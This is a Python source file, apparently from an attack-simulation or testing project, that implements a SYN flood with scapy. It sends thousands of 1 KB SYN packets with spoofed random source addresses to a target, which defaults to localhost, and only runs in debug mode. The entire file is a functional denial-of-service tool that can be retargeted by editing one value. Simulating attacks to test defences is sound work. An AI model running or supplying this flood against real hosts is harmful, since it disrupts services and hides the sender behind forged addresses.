from scapy.all import IP, TCP, Raw, RandShort, send
from random import randint
from logs.logger import setup_logger
import time
from config import Config

logger = setup_logger('attack_simulator')

# Target configuration
target_ip = "127.0.0.1"  # Localhost for testing
target_port = 80

def syn_flood(target_ip='127.0.0.1', target_port=80, packet_count=10000):
    """SYN flood attack with logging"""
    logger.info(f"Starting SYN flood attack on {target_ip}:{target_port}")
    
    for i in range(packet_count):
        try:
            # Randomize source IP and port
            src_ip = f"{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}"
            
            # Create packet
            ip = IP(src=src_ip, dst=target_ip)
            tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
            raw = Raw(b"X" * 1024)  # 1KB payload
            packet = ip / tcp / raw
            
            # Send packet
            send(packet, verbose=0)
            
            # Log every 100 packets
            if i % 100 == 0:
                logger.info(f"Sent {i} SYN packets to {target_ip}:{target_port}")
                
        except Exception as e:
            logger.error(f"Error sending packet: {str(e)}")
            time.sleep(0.1)  # Brief pause on error
    
    logger.info(f"Attack completed. Sent {packet_count} SYN packets")

if __name__ == "__main__":
    if Config.DEBUG:
        syn_flood(target_ip, target_port, packet_count=5000)
    else:
        logger.warning("Attack simulation disabled in production mode")